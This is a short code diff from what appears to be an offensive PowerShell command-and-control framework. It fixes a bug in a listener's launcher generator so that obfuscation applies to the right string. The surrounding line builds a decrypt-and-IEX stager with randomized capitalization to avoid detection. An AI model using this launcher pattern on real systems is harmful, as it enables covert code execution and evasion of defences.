@@ -490,7 +490,7 @@ class Listener(object):
                 launcherBase += helpers.randomize_capitalization("-join[Char[]](& $R $"+vData+" ($IV+$K))|IEX")
 
                 if obfuscate:
-                    launcherBase = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
+                    launcherBase = helpers.obfuscate(self.mainMenu.installPath, launcherBase, obfuscationCommand=obfuscationCommand)
 
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(launcherBase, launcher)
